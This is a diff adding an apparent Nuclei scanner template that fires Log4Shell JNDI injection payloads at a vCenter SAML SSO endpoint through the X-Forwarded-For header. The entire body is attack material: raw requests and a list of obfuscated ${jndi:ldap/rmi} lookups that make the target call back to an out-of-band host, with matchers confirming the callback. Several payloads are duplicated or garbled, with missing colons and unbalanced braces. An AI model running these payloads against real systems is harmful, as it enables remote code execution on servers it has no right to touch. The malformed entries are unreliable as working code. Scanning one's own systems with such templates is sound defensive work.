@@ -1,0 +1,54 @@
+id: log4j-fuzz-head-poc
+
+info:
+  name: log4j-rce-structs2
+  author: dr34d
+  severity: critical
+  tags: vcenter,rce
+
+requests:
+  - raw:
+      - |
+        GET /websso/SAML2/SSO/photon-machine.lan?SAMLRequest= HTTP/1.1
+        Host: {{Hostname}}
+        {{log4j_payloads}}
+
+
+      - |
+        POST /websso/SAML2/SSO/photon-machine.lan?SAMLRequest= HTTP/1.1
+        Host: {{Hostname}}
+        {{log4j_payloads}}
+
+    payloads:
+      log4j_payloads:
+        - 'X-Forwarded-For: ${jndi:ldap://{{interactsh-url}}/info}'
+        - 'X-Forwarded-For:${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{interactsh-url}}/poc}'
+        - 'X-Forwarded-For:${${::-j}ndi:rmi://{{interactsh-url}}/ass}'
+        - 'X-Forwarded-For:${jndi:rmi://{{interactsh-url}}}'
+        - 'X-Forwarded-For:${${lower:jndi}:${lower:rmi}://{{interactsh-url}}/poc}'
+        - 'X-Forwarded-For:${${lower:${lower:jndi}}:${lower:rmi}://{{interactsh-url}}/poc}'
+        - 'X-Forwarded-For:${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{interactsh-url}}/poc}'
+        - 'X-Forwarded-For:${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{interactsh-url}}/poc}'
+        - 'X-Forwarded-For:${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{interactsh-url}}/poc}'
+        - 'X-Forwarded-For:${${::-j}ndi:rmi://{{interactsh-url}}/ass}'
+        - 'X-Forwarded-For:${jndi:rmi://{{interactsh-url}}}'
+        - 'X-Forwarded-For:${${lower:jndi}:${lower:rmi}://{{interactsh-url}}/poc}'
+        - 'X-Forwarded-For:${${lower:${lower:jndi}}:${lower:rmi}://{{interactsh-url}}/poc}'
+        - 'X-Forwarded-For:${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{interactsh-url}}/poc}'
+        - 'X-Forwarded-For:${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{interactsh-url}}/poc}'
+        - 'X-Forwarded-Forldap://{{interactsh-url}}/cn=JndiExploit,dc=apache,dc=org?Type=A Type ${jndildap://{{interactsh-url}}/cn=JndiExploit,dc=apache,dc=org?Type=A Typeldapldap://{{interactsh-url}}/cn=JndiExploit,dc=apache,dc=org?Type=A Type//{{interactsh-url}}/info}'
+        - 'X-Forwarded-Forldap://{{interactsh-url}}/cn=JndiExploit,dc=apache,dc=org?Type=A Type ${jndildap://{{interactsh-url}}/cn=JndiExploit,dc=apache,dc=org?Type=A Typeldapldap://{{interactsh-url}}/cn=JndiExploit,dc=apache,dc=org?Type=A Type//{{interactsh-url}}/info}'
+    attack: clusterbomb
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        name: http
+        words:
+          - "http"
+
+      - type: word
+        part: interactsh_protocol
+        name: dns
+        words:
+          - "dns"
